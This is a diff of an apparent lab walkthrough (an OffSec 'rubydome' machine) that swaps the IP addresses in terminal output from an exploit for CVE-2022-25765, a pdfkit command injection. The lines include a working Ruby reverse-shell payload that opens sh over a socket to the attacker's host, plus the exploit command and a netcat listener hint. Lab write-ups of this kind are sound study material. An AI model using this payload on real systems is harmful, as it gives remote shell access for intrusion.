@@ -64,7 +64,7 @@ Inspect Element to find Parameter
 Getting reverse shell using this exploit.
 
 ┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
-└─$ python3 51293.py -s 192.168.45.184 80 -w <http://192.168.216.22:3000/pdf> -p url
+└─$ python3 51293.py -s 192.168.49.56 80 -w <http://192.168.56.22:3000/pdf> -p url
 
         _ __,~~~/_        __  ___  _______________  ___  ___
     ,~~`( )_( )-\\|       / / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\
@@ -73,10 +73,10 @@ _V__v___!_!__!_____V____\\____/_/|_/___/\\___/\\____/_/|_/____/....
     
 UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
 OPTIONS: Reverse Shell Sent to Target Website Mode
-PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.184","80"))'`
+PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.49.56","80"))'`
 LOCALIP: 192.168.45.184:80
 WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 80".
-WEBSITE: <http://192.168.216.22:3000/pdf>
+WEBSITE: <http://192.168.56.22:3000/pdf>
 POSTARG: url
 EXPLOIT: Payload sent to website!
 SUCCESS: Exploit performed action.
